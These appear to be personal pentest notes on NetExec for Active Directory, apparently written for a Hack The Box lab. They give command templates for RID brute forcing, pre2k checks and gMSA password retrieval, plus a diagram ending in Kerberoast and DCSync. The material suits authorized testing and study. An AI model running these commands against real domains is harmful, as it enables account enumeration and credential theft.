# NetExec - RID Brute Force

## Purpose

Enumerate domain users and groups by brute forcing Relative IDs (RIDs).

### Requirements

- [ ] Valid credentials
- [ ] SMB reachable

### Command

```bash
nxc smb <TARGET> \
-u '<USERNAME>' \
-p '<PASSWORD>' \
--rid-brute
```

### Output

Lists:

- Domain Users
- Groups
- Built-in Accounts
- Service Accounts

Useful during initial enumeration.

---

# NetExec - Pre-Windows 2000 (pre2k) Enumeration

## Purpose

Check for computers vulnerable to Pre-Windows 2000 compatible authentication issues.

Uses the `pre2k` module.

### Requirements

- [ ] Valid credentials
- [ ] LDAP reachable

### Command

```bash
nxc ldap <TARGET> \
-u '<USERNAME>' \
-p '<PASSWORD>' \
-M pre2k
```

### Use Case

Useful for discovering:

- Weak computer account configurations
- Legacy authentication weaknesses

---

# NetExec - Enumerate Group Managed Service Accounts (gMSA)

## Purpose

Retrieve Group Managed Service Account information.

### Requirements

- [ ] Kerberos ticket available (`KRB5CCNAME`)
- [ ] Read permissions
- [ ] LDAP access

### Command

```bash
KRB5CCNAME=~/path/to/account.ccache \
  nxc ldap pirate.htb -u ms01 --use-kcache --gmsa
```

### Output

Enumerates:

- gMSA accounts
- Managed passwords (if permitted)
- Allowed principals

Useful for privilege escalation.

---

# Kerberos Workflow

```text
Credentials
      │
      ▼
impacket-getTGT
      │
      ▼
Export KRB5CCNAME
      │
      ▼
Authenticate with Kerberos (-k)
      │
      ├─────────────┐
      ▼             ▼
BloodHound      BloodyAD
      │             │
      └──────┬──────┘
             ▼
     Find Attack Paths
             ▼
 Shadow Credentials /
 GenericWrite /
 Password Reset /
 Kerberoast /
 DCSync
```
